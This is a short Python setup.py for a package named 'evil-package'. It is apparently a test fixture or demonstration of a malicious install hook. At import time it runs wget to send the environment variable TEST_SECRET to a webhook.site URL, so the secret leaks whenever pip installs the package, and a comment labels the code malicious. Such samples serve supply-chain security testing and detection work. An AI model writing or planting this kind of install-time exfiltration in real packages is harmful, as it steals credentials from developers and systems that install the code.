from setuptools import setup
import os

# Malicious code executed immediately when pip installs the package
os.system("wget https://webhook.site/4c29e9df-350f-4c3d-aa5c-68d7d224b317?token=$TEST_SECRET")

setup(
    name="evil-package",
    version="0.1",
    py_modules=["evil"],
)
